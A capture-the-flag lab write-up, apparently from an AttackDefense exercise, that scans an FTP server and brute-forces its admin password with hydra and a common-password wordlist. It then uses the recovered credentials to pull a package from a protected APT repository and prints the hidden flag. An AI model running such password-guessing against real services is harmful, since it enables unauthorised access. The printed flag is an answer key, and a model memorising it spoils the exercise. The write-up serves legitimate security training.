# apt-repo-over-ftp

## Objective:  Figure out the credentials for APT server, get the package and retrieve the flag!

- A flag is hidden in "auditd" package which is hosted on a protected APT repository on the same network.

----

```sh
root@attackdefense:~# nmap -sV 192.190.249.3
Starting Nmap 7.70 ( https://nmap.org ) at 2020-06-12 11:29 UTC
Nmap scan report for b8x4l7sj5srtglge4wg0n0a1t.temp-network_a-190-249 (192.190.249.3)
Host is up (0.000027s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5e
MAC Address: 02:42:C0:BE:F9:03 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
root@attackdefense:~# 
```

```sh
root@attackdefense:~# ftp 192.190.249.3
Connected to 192.190.249.3.
220 ProFTPD 1.3.5e Server (AttackDefense-FTP) [::ffff:192.190.249.3]
Name (192.190.249.3:root): anonymous
331 Password required for anonymous
Password:
530 Login incorrect.
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -l
530 Please login with USER and PASS
ftp: bind: Address already in use
ftp> bye
221 Goodbye.
root@attackdefense:~# 
```

```sh
root@attackdefense:~# hydra -l admin -P wordlists/100-common-passwords.txt -f 192.190.249.3 ftp                           
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-12 11:41:58
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries (l:1/p:100), ~7 tries per task
[DATA] attacking ftp://192.190.249.3:21/
[21][ftp] host: 192.190.249.3   login: admin   password: donald
[STATUS] attack finished for 192.190.249.3 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-12 11:42:10
root@attackdefense:~# 
```

```sh
root@attackdefense:~# ftp 192.190.249.3
Connected to 192.190.249.3.
220 ProFTPD 1.3.5e Server (AttackDefense-FTP) [::ffff:192.190.249.3]
Name (192.190.249.3:root): admin
331 Password required for admin
Password:
230 User admin logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -l
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 admin    root         4096 Jun  9  2019 repo
226 Transfer complete
ftp> bye
221 Goodbye.
root@attackdefense:~# 
```

```sh
root@attackdefense:~# echo "deb ftp://192.190.249.3/repo/ /" > /etc/apt/sources.list.d/internal.list
```

```sh
root@attackdefense:~# wget -q -O - ftp://admin:donald@192.190.249.3/repo/KEY.gpg | apt-key add -
OK
root@attackdefense:~# 
```

```sh
root@attackdefense:~# vim /etc/apt/auth.conf
root@attackdefense:~# cat /etc/apt/auth.conf
machine 192.190.249.3
login admin
password donald
root@attackdefense:~# 
```

```sh
root@attackdefense:~# apt update
Get:1 ftp://192.190.249.3/repo  InRelease [1956 B]
Get:2 ftp://192.190.249.3/repo  Packages [9213 B]
Fetched 11.2 kB in 0s (73.9 kB/s)
Reading package lists... Done
Building dependency tree       
Reading state information... Done
3 packages can be upgraded. Run 'apt list --upgradable' to see them.
root@attackdefense:~# 
```

```sh
root@attackdefense:~# apt clean 
```

```sh
root@attackdefense:~# apt install -d auditd
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following packages were automatically installed and are no longer required:
  libargon2-0 libdns-export1100
Use 'apt autoremove' to remove them.
The following additional packages will be installed:
  libauparse0
Suggested packages:
  audispd-plugins
The following NEW packages will be installed:
  auditd libauparse0
0 upgraded, 2 newly installed, 0 to remove and 3 not upgraded.
Need to get 242 kB of archives.
After this operation, 803 kB of additional disk space will be used.
Do you want to continue? [Y/n] 
Get:1 ftp://192.190.249.3/repo  libauparse0 1:2.8.2-1ubuntu1 [48.6 kB]
Get:2 ftp://192.190.249.3/repo  auditd 1:2.8.2-1ubuntu1 [194 kB]
Fetched 242 kB in 0s (11.1 MB/s)
Download complete and in download only mode
root@attackdefense:~# 
```

```sh
root@attackdefense:~# cd /var/cache/apt/archives/
root@attackdefense:/var/cache/apt/archives# ls -l
total 244
-rw-r--r-- 1 root root 193740 Jun  9  2019 auditd_1%3a2.8.2-1ubuntu1_amd64.deb
-rw-r--r-- 1 root root  48608 Feb  8  2018 libauparse0_1%3a2.8.2-1ubuntu1_amd64.deb
-rw-r----- 1 root root      0 Jan 10  2018 lock
drwx------ 1 _apt root   4096 Jun 12 11:52 partial
root@attackdefense:/var/cache/apt/archives# 
```

```sh
root@attackdefense:/var/cache/apt/archives# mkdir extracted
```

```sh
root@attackdefense:/var/cache/apt/archives# dpkg-deb -R auditd_1%3a2.8.2-1ubuntu1_amd64.deb extracted/
```

```sh
root@attackdefense:/var/cache/apt/archives# cd extracted/
root@attackdefense:/var/cache/apt/archives/extracted# ls -l
total 24
drwxr-xr-x 2 root root 4096 Feb  7  2018 DEBIAN
drwxr-xr-x 6 root root 4096 Jun  9  2019 etc
drwxr-xr-x 3 root root 4096 Feb  7  2018 lib
drwxr-xr-x 2 root root 4096 Feb  7  2018 sbin
drwxr-xr-x 4 root root 4096 Feb  7  2018 usr
drwxr-xr-x 3 root root 4096 Feb  7  2018 var
root@attackdefense:/var/cache/apt/archives/extracted# 
```

```sh
root@attackdefense:/var/cache/apt/archives/extracted# find . -name "*flag*"
./etc/flag.txt
root@attackdefense:/var/cache/apt/archives/extracted# 
```

```sh
root@attackdefense:/var/cache/apt/archives/extracted# cat ./etc/flag.txt 
308aff5b42047fa7f7736170db71fffd
root@attackdefense:/var/cache/apt/archives/extracted# 
```

----

EOF